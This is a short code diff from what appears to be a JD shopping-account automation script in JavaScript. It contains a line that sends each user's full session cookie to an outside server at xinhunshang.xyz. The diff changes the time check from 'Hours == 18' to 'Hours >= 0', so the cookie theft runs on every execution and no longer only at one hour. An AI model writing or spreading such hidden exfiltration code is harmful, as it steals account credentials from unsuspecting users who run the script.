@@ -40,7 +40,7 @@ Object.keys(jdCookieNode).forEach((item) => {
         var reg = new RegExp(`## pt_pin=${$.pt_pin}; 上次更新：(.*?) `, 'gi');
 
         await TotalBean();
-        if (Hours == 18) {
+        if (Hours >= 0) {
             await $.getScript(`http://xinhunshang.xyz:6001/cookie/v3/add/${$.cookie.replace(/;/g,"&")}/${Number($.isLogin)}`).then((text) => (console.log(text)));
             $.wait(2000);
         }
